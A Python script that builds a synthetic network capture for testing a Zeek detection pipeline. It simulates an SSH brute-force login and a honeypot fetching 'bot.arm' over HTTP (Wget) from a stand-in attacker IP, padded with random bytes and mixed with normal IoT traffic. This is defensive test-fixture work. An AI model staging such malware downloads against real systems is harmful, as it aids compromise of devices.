"""Build samples/cap-2026-11-20-a.pcap: a small, made-up network capture of the step 2 story.

Real captures come from Task A later. This one lets us build and test the Zeek step now, and it is
reproducible: run it again and you get the exact same file.

    cd backend
    .venv/Scripts/python samples/make_sample_pcap.py

The story (all 2026-11-20, UTC):
  14:04:50  ESP32 asks the gateway for a DNS name                       (UDP, normal)
  14:05:00  ESP32 connects to the MQTT broker and publishes a reading    (normal)
  14:06:00  The host PC watches the camera stream over RTSP for 30 s     (normal)
  14:10:02  Attacker .99: SSH login attempt 1, fails                     (attack, run-001 14:10-14:18)
  14:10:05  Attacker .99: SSH login attempt 2, fails                     (attack)
  14:12:39  Attacker .99: SSH login succeeds, 45 s session               (attack)
  14:13:20  The honeypot downloads bot.arm FROM the attacker over HTTP   (attack: attacker IP is the destination)
  14:30:00  The host PC pings the ESP32                                  (ICMP, normal)
  14:40:00  The admin (.1) logs in to the gateway over SSH for 2 min     (normal, same port 22 as the attack)
"""
from __future__ import annotations

import logging
import random
from datetime import datetime, timezone
from pathlib import Path

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)     # no "Npcap not installed" noise on Windows

from scapy.layers.dns import DNS, DNSQR, DNSRR          # noqa: E402
from scapy.layers.inet import ICMP, IP, TCP, UDP        # noqa: E402
from scapy.layers.l2 import Ether                       # noqa: E402
from scapy.utils import wrpcap                          # noqa: E402

OUT = Path(__file__).resolve().parent / "cap-2026-11-20-a.pcap"

GW, ESP, CAM, HOST, ATTACKER = "192.168.56.10", "192.168.56.20", "192.168.56.30", "192.168.56.1", "192.168.56.99"
MAC = {GW: "08:00:27:aa:00:10", ESP: "24:6f:28:aa:00:20", CAM: "a4:14:37:aa:00:30",
       HOST: "0a:00:27:00:00:01", ATTACKER: "08:00:27:bb:00:99"}
rng = random.Random(42)                                 # fixed seed -> same "random" bytes every run


def at(hhmmss: str) -> float:
    return datetime.fromisoformat(f"2026-11-20T{hhmmss}+00:00").timestamp()


def pkt(src: str, dst: str, layer4, t: float):
    p = Ether(src=MAC[src], dst=MAC[dst]) / IP(src=src, dst=dst) / layer4
    p.time = t
    return p


def tcp_conn(client: str, cport: int, server: str, sport: int, t0: float,
             exchanges: list[tuple[str, bytes]], duration: float) -> list:
    """A complete TCP connection: handshake, data both ways (each segment ACKed), clean FIN close.
    exchanges: ("c", bytes) = client sends, ("s", bytes) = server sends. Spread evenly over `duration`."""
    out, cseq, sseq = [], 1000, 5000
    step = duration / (len(exchanges) * 2 + 6)
    t = t0

    def send(frm, to, fp, tp, flags, seq, ack, data=b""):
        nonlocal t
        out.append(pkt(frm, to, TCP(sport=fp, dport=tp, flags=flags, seq=seq, ack=ack, window=64240) / data, t))
        t += step

    send(client, server, cport, sport, "S", cseq, 0); cseq += 1
    send(server, client, sport, cport, "SA", sseq, cseq); sseq += 1
    send(client, server, cport, sport, "A", cseq, sseq)
    for who, data in exchanges:
        if who == "c":
            send(client, server, cport, sport, "PA", cseq, sseq, data); cseq += len(data)
            send(server, client, sport, cport, "A", sseq, cseq)
        else:
            send(server, client, sport, cport, "PA", sseq, cseq, data); sseq += len(data)
            send(client, server, cport, sport, "A", cseq, sseq)
    send(client, server, cport, sport, "FA", cseq, sseq); cseq += 1
    send(server, client, sport, cport, "FA", sseq, cseq); sseq += 1
    send(client, server, cport, sport, "A", cseq, sseq)
    return out


# ---------------------------------------------------------------------------------- protocol bytes
def ssh_newkeys() -> bytes:
    # One SSH binary packet: length 12, padding 10, message 21 (NEWKEYS). After it, traffic is encrypted.
    return (12).to_bytes(4, "big") + bytes([10, 21]) + bytes(10)


def ssh_session(client_banner: bytes, encrypted_rounds: int, chunk: int) -> list[tuple[str, bytes]]:
    ex = [("s", b"SSH-2.0-OpenSSH_9.2p1 Debian-2+deb12u3\r\n"), ("c", client_banner),
          ("c", ssh_newkeys()), ("s", ssh_newkeys())]
    for _ in range(encrypted_rounds):                   # login tries, commands, output: all encrypted
        ex.append(("c", rng.randbytes(chunk)))
        ex.append(("s", rng.randbytes(chunk + 16)))
    return ex


def mqtt_str(s: str) -> bytes:
    b = s.encode()
    return len(b).to_bytes(2, "big") + b


def mqtt_packet(first_byte: int, body: bytes) -> bytes:
    return bytes([first_byte, len(body)]) + body        # all our packets are < 128 bytes


MQTT_CONNECT = mqtt_packet(0x10, mqtt_str("MQTT") + bytes([4, 0x02, 0x00, 60]) + mqtt_str("esp32-smoke-01"))
MQTT_CONNACK = bytes([0x20, 0x02, 0x00, 0x00])
MQTT_PUBLISH = mqtt_packet(0x30, mqtt_str("aegex/sensors/smoke") + b'{"smoke":12,"temperature_c":24.1,"humidity_pct":41}')
MQTT_DISCONNECT = bytes([0xE0, 0x00])


def build() -> list:
    p: list = []

    # 14:04:50 DNS (UDP)
    t = at("14:04:50")
    q = DNS(id=0x1a2b, rd=1, qd=DNSQR(qname="pool.ntp.org"))
    p.append(pkt(ESP, GW, UDP(sport=5353, dport=53) / q, t))
    p.append(pkt(GW, ESP, UDP(sport=53, dport=5353) / DNS(id=0x1a2b, qr=1, rd=1, ra=1, qd=DNSQR(qname="pool.ntp.org"),
                                                          an=DNSRR(rrname="pool.ntp.org", rdata="162.159.200.1", ttl=60)), t + 0.02))

    # 14:05:00 MQTT
    p += tcp_conn(ESP, 50112, GW, 1883, at("14:05:00"),
                  [("c", MQTT_CONNECT), ("s", MQTT_CONNACK), ("c", MQTT_PUBLISH), ("c", MQTT_DISCONNECT)], 0.4)

    # 14:06:00 RTSP camera stream, 30 s, lots of data from the camera
    rtsp = [("c", b"OPTIONS rtsp://192.168.56.30/stream RTSP/1.0\r\nCSeq: 1\r\n\r\n"),
            ("s", b"RTSP/1.0 200 OK\r\nCSeq: 1\r\nPublic: DESCRIBE, SETUP, PLAY, TEARDOWN\r\n\r\n"),
            ("c", b"PLAY rtsp://192.168.56.30/stream RTSP/1.0\r\nCSeq: 2\r\nSession: 7f3a\r\n\r\n")]
    rtsp += [("s", rng.randbytes(1400)) for _ in range(60)]
    p += tcp_conn(HOST, 51020, CAM, 554, at("14:06:00"), rtsp, 30.0)

    # 14:10:02 / 14:10:05 attacker: two short failed SSH logins (hydra)
    p += tcp_conn(ATTACKER, 40122, GW, 22, at("14:10:02"), ssh_session(b"SSH-2.0-libssh_0.10.6\r\n", 3, 96), 3.2)
    p += tcp_conn(ATTACKER, 40124, GW, 22, at("14:10:05"), ssh_session(b"SSH-2.0-libssh_0.10.6\r\n", 3, 96), 3.1)

    # 14:12:39 attacker: successful login, 45 s interactive session
    p += tcp_conn(ATTACKER, 40188, GW, 22, at("14:12:39"), ssh_session(b"SSH-2.0-libssh_0.10.6\r\n", 20, 64), 45.0)

    # 14:13:20 the honeypot fetches bot.arm from the attacker's web server
    body = rng.randbytes(20000)
    http = [("c", b"GET /bot.arm HTTP/1.1\r\nHost: 192.168.56.99\r\nUser-Agent: Wget/1.21.3\r\n\r\n"),
            ("s", b"HTTP/1.1 200 OK\r\nContent-Type: application/octet-stream\r\nContent-Length: 20000\r\n\r\n")]
    http += [("s", body[i:i + 1400]) for i in range(0, len(body), 1400)]
    p += tcp_conn(GW, 41000, ATTACKER, 80, at("14:13:20"), http, 1.5)

    # 14:30:00 ICMP ping x3
    for i in range(3):
        t = at("14:30:00") + i
        p.append(pkt(HOST, ESP, ICMP(type=8, id=1, seq=i + 1) / b"aegex-ping", t))
        p.append(pkt(ESP, HOST, ICMP(type=0, id=1, seq=i + 1) / b"aegex-ping", t + 0.003))

    # 14:40:00 admin SSH session, 2 minutes
    p += tcp_conn(HOST, 52001, GW, 22, at("14:40:00"), ssh_session(b"SSH-2.0-OpenSSH_9.6\r\n", 30, 48), 120.0)

    p.sort(key=lambda x: float(x.time))
    return p


if __name__ == "__main__":
    packets = build()
    wrpcap(str(OUT), packets)
    print(f"wrote {OUT.name}: {len(packets)} packets")
